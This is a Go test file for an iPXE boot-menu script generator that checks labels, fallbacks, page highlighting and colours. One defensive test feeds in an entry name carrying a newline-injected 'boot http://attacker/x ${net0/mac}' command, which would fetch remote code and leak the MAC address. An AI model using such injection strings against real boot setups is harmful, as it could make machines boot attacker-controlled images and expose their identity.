package menu

import (
	"fmt"
	"strings"
	"testing"
)

func TestEveryEntryGetsAnItemAndASectionThatFailsToTheMessage(t *testing.T) {
	script := Script("Gola Bootlace", []Entry{
		{Name: "Ubuntu 24.04 Desktop", Commands: []string{"kernel http://s/k", "boot"}},
		{Name: "Windows 11", Commands: []string{"echo windows"}},
	})
	for _, want := range []string{
		"#!ipxe\n", "menu Gola Bootlace\n", "item e0-ubuntu-24-04-desktop Ubuntu 24.04 Desktop\n", "item e1-windows-11 Windows 11\n",
		":e0-ubuntu-24-04-desktop\nkernel http://s/k || goto failed\nboot || goto failed\ngoto failed\n",
		":failed\n", "choose --default ${menu-default} selected || goto shell\n", ":shell\nshell\n",
	} {
		if !strings.Contains(script, want) {
			t.Errorf("the script lacks %q:\n%s", want, script)
		}
	}
}

func TestAnEmptyFolderStillGivesAUsableMenu(t *testing.T) {
	script := Script("Gola Bootlace", nil)
	if !strings.Contains(script, "No ISO files were found") || !strings.Contains(script, "item shell") {
		t.Errorf("empty menu:\n%s", script)
	}
}

func TestStrangeNamesCannotInjectCommands(t *testing.T) {
	script := Script("t", []Entry{{Name: "evil\nboot http://attacker/x ${net0/mac}", Commands: []string{"echo ok"}}})
	for _, line := range strings.Split(script, "\n") {
		if strings.HasPrefix(line, "boot http://attacker") {
			t.Fatalf("a name started its own command line: %q", line)
		}
	}
	if strings.Contains(script, "${net0/mac}") && strings.Contains(strings.Split(script, "item e0")[1], "${net0") {
		t.Error("a name must not expand iPXE variables")
	}
}

func TestLabelsAreUniqueEvenForTheSameName(t *testing.T) {
	script := Script("t", []Entry{{Name: "Same"}, {Name: "Same"}})
	if strings.Count(script, ":e0-same\n") != 1 || strings.Count(script, ":e1-same\n") != 1 {
		t.Errorf("labels:\n%s", script)
	}
}

func TestTheMenuCanLeaveTheNetworkBootForTheOwnDisk(t *testing.T) {
	s := ScriptWith("Gola Bootlace", []Entry{{Name: "One", Commands: []string{"echo hi"}}}, Options{Default: -1, Timeout: 5})
	for _, want := range []string{"set menu-default local", "item local ", ":local\n", "\nexit\n", "--timeout 5000"} {
		if !strings.Contains(s, want) {
			t.Errorf("missing %q in\n%s", want, s)
		}
	}
	if strings.Contains(Script("x", nil), "set menu-default local") {
		t.Error("the own disk must not be the default unless asked for")
	}
}

func TestDirectAndLocalScriptsHaveNoMenu(t *testing.T) {
	d := Direct("Rule: this PC starts X", Entry{Name: "X", Commands: []string{"echo a", "boot"}}, "http://s/menu?page=1")
	if strings.Contains(d, "choose") || !strings.Contains(d, "echo a || goto failed\n") || !strings.Contains(d, ":failed") || !strings.HasPrefix(d, "#!ipxe\necho Rule: this PC starts X\n") {
		t.Fatal(d)
	}
	if l := Local("own disk"); l != "#!ipxe\necho own disk\nexit\n" {
		t.Fatal(l)
	}
}

func TestAFailedStartWaitsThenReturnsToTheMenuNotToTheDisk(t *testing.T) {
	back := "http://s/menu?page=1"
	for name, script := range map[string]string{
		"menu":   ScriptWith("x", []Entry{{Name: "A", Commands: []string{"boot"}}}, Options{Again: back}),
		"direct": Direct("Rule", Entry{Name: "A", Commands: []string{"boot"}}, back),
	} {
		for _, want := range []string{":failed\necho Booting did not work: read the message above.\nprompt --timeout 20000 ", " || echo\ngoto again\n", ":again\nchain " + back + " || goto shell\n"} {
			if !strings.Contains(script, want) {
				t.Errorf("%s: missing %q in\n%s", name, want, script)
			}
		}
		if strings.Contains(script, "${self}") {
			t.Errorf("%s: ${self} is not an iPXE setting", name)
		}
		// the only way to the PC's own disk is the explicit entry
		if strings.Count(script, "\nexit\n") > 1 {
			t.Errorf("%s: more than one way to the disk:\n%s", name, script)
		}
	}
	if s := Direct("Rule", Entry{Name: "A", Commands: []string{"boot"}}, ""); !strings.Contains(s, ":again\nshell\n") {
		t.Errorf("without an address the shell is the way out:\n%s", s)
	}
}

func TestTheAccentColourIsTheChosenLineAndTheHeadings(t *testing.T) {
	def := ScriptWith("x", nil, Options{})
	if !strings.Contains(def, "cpair --foreground 7 --background 1 2 ") || !strings.Contains(def, "cpair --foreground 1 --background 0 3 ") {
		t.Fatalf("Gola's red is the default:\n%s", def)
	}
	// (the picture menu keeps iPXE's own colours until an accent is chosen: the only cpair lines are the ones after :plain)
	if pic := ScriptWith("x", nil, Options{Picture: "http://s/bg.png", Width: 1024, Height: 768}); strings.Index(pic, "--background 1 2") < strings.Index(pic, ":plain") {
		t.Fatal("without an accent only the text fallback has colours")
	}
	for _, name := range AccentNames {
		s := ScriptWith("x", nil, Options{Accent: name})
		a := accents[name]
		want := fmt.Sprintf("cpair --foreground %d --background %d 2 ", a.text, a.colour)
		if !strings.Contains(s, want) || !strings.Contains(s, fmt.Sprintf("cpair --foreground %d --background 0 3 ", a.colour)) {
			t.Errorf("%s: want %q in\n%s", name, want, s)
		}
	}
	blue := ScriptWith("x", nil, Options{Accent: "blue", Picture: "http://s/bg.png", Width: 1024, Height: 768})
	if strings.Index(blue, "--background 4 2") > strings.Index(blue, "console --x") {
		t.Errorf("a chosen accent also colours the picture menu, so it is set before the picture:\n%s", blue)
	}
	if got := ScriptWith("x", nil, Options{Accent: "nonsense"}); !strings.Contains(got, "--background 1 2 ") {
		t.Error("an unknown name falls back to red")
	}
}

// A page reached with the page buttons keeps the highlight on the button that goes on, whatever the PC's default is, on a BIOS PC (text frame) as on a UEFI PC.
func TestPageButtonsKeepTheHighlightWhateverTheDefault(t *testing.T) {
	entries := []Entry{{Name: "a.iso", Commands: []string{"echo a"}}, {Name: "b.iso", Commands: []string{"echo b"}}}
	for _, ascii := range []bool{false, true} {
		for _, def := range []int{-1, 0, 1} { // own disk, nothing, the first ISO
			middle := ScriptWith("Gola Bootlace", entries, Options{Default: def, Prev: "http://x/menu?page=1", Next: "http://x/menu?page=3", Focus: "next", Ascii: ascii, Pages: 3, Page: 2})
			if !strings.Contains(middle, "set menu-default next\n") {
				t.Errorf("ascii=%v default=%d: a middle page reached with the buttons does not highlight Next page:\n%s", ascii, def, middle[:200])
			}
			last := ScriptWith("Gola Bootlace", entries, Options{Default: def, Prev: "http://x/menu?page=2", Focus: "next", Ascii: ascii, Pages: 3, Page: 3})
			if !strings.Contains(last, "set menu-default prev\n") {
				t.Errorf("ascii=%v default=%d: the last page does not highlight Previous page:\n%s", ascii, def, last[:200])
			}
		}
		first := ScriptWith("Gola Bootlace", entries, Options{Default: -1, Next: "http://x/menu?page=2", Ascii: ascii, Pages: 2, Page: 1})
		if !strings.Contains(first, "set menu-default local\n") {
			t.Errorf("ascii=%v: the first page of a menu whose default is the PC's own disk must still highlight that:\n%s", ascii, first[:200])
		}
	}
}

// The picture is set up once and a later page finds the console as it is: changing pages must not blank the screen and download the picture again.
func TestThePictureIsSetUpOnlyOnce(t *testing.T) {
	s := ScriptWith("x", []Entry{{Name: "a.iso", Commands: []string{"echo a"}}}, Options{Picture: "http://s/bg.png", Width: 1024, Height: 768, Pages: 2, Page: 2, Prev: "http://s/menu"})
	skip, console := strings.Index(s, "isset ${gfx-ready} && goto gfx || goto setup\n:setup\n"), strings.Index(s, "console --x")
	if skip < 0 || console < 0 || skip > console {
		t.Fatalf("the console command must be skipped once the picture is up:\n%s", s)
	}
	if !strings.Contains(s, "&& set gfx-ready 1 && goto gfx || goto plain\n") {
		t.Errorf("a successful console command must record that the picture is up, and a failed one still falls back to the text menu:\n%s", s)
	}
}

// isset and iseq fail when the answer is "no", and a line that fails without a || after it ends the whole script ("Could not boot: No such file or directory"):
// that is what made the menu of 0.2.1 unusable on UEFI. Every such line must have a fallback.
func TestEveryTestCommandHasAFallback(t *testing.T) {
	entries := []Entry{{Name: "a.iso", Commands: []string{"echo a"}}}
	for _, o := range []Options{{}, {Ascii: true}, {Picture: "http://s/bg.png", Width: 1024, Height: 768, Pages: 2, Page: 2, Prev: "http://s/menu", Next: "http://s/menu?page=3", Focus: "next"}} {
		for _, line := range strings.Split(ScriptWith("x", entries, o), "\n") {
			if (strings.HasPrefix(line, "isset ") || strings.HasPrefix(line, "iseq ") || strings.HasPrefix(line, "isset\t")) && !strings.Contains(line, "||") {
				t.Errorf("a test line without a fallback ends the script when it fails: %q", line)
			}
		}
	}
}

// A page reached with a page button highlights that same button (forwards: Next page, backwards: Previous page), and the other one where that one does not exist.
func TestThePageButtonThatWasPressedStaysHighlightedInTheSameDirection(t *testing.T) {
	entries := []Entry{{Name: "a.iso", Commands: []string{"echo a"}}, {Name: "b.iso", Commands: []string{"echo b"}}}
	for _, ascii := range []bool{false, true} {
		for _, def := range []int{-1, 0, 1} { // the PC's own disk, nothing, the first ISO: the buttons win over each of them
			for _, tc := range []struct {
				name       string
				focus      string
				prev, next string
				want       string
			}{
				{"forwards, middle page", "next", "http://x/menu?page=1", "http://x/menu?page=3", "next"},
				{"forwards, last page", "next", "http://x/menu?page=2", "", "prev"},
				{"backwards, middle page", "prev", "http://x/menu?page=1", "http://x/menu?page=3", "prev"},
				{"backwards, first page", "prev", "", "http://x/menu?page=2", "next"},
			} {
				got := ScriptWith("Gola Bootlace", entries, Options{Default: def, Prev: tc.prev, Next: tc.next, Focus: tc.focus, Ascii: ascii, Pages: 3, Page: 2})
				if !strings.Contains(got, "set menu-default "+tc.want+"\n") {
					t.Errorf("ascii=%v default=%d %s: want the highlight on %s:\n%.200s", ascii, def, tc.name, tc.want, got)
				}
			}
		}
	}
	if got := ScriptWith("x", entries, Options{Default: -1, Next: "http://x/menu?page=2", Pages: 2, Page: 1}); !strings.Contains(got, "set menu-default local\n") {
		t.Errorf("the first page, not reached with a button, keeps the PC's default:\n%.200s", got)
	}
}
